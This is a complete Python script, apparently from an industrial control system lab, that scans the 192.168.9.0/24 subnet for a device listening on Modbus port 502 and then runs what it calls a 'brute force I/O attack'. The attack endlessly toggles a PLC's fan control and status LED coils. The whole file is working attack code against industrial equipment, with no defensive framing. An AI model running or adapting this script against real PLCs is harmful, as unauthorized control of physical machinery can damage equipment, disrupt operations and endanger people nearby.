from pyModbusTCP.client import ModbusClient
from ipaddress import ip_network
import time
import socket

# Function to scan the network for the PLC's IP address
def find_plc_ip(subnet, port=502):
    print(f"Scanning network {subnet} for PLC on port {port}...")
    for ip in ip_network(subnet).hosts():
        ip = str(ip)
        try:
            with socket.create_connection((ip, port), timeout=0.1):
                print(f"Found PLC at IP: {ip}")
                return ip
        except (socket.timeout, ConnectionRefusedError):
            continue
    print("PLC not found on the network.")
    return None

# Function to brute force I/O points
def brute_force_io(plc_ip):
    # Create Modbus TCP client
    plc = ModbusClient(host=plc_ip, port=502, auto_open=True)
    if not plc.is_open:
        print("Failed to connect to PLC.")
        return

    # Target output addresses
    target_outputs = [
        0,  # %Q0.0 (Fan Control)
        4,  # %Q0.4 (Fan A Red LED)
        5   # %Q0.5 (Fan A Green LED)
    ]

    # Brute force loop
    print("Starting brute force I/O attack...")
    try:
        while True:
            for addr in target_outputs:
                # Toggle the output value
                plc.write_single_coil(addr, True)
                time.sleep(0.1)
                plc.write_single_coil(addr, False)
                time.sleep(0.1)
                print(f"Toggled %Q0.{addr}")
    except KeyboardInterrupt:
        print("Brute force attack stopped.")
    finally:
        plc.close()

# Main script
if __name__ == "__main__":
    # Network configuration
    subnet = "192.168.9.0/24"  # Adjust based on your network

    # Find PLC IP address
    plc_ip = find_plc_ip(subnet)
    if not plc_ip:
        exit("PLC not found. Exiting.")

    # Start brute force I/O attack
    brute_force_io(plc_ip)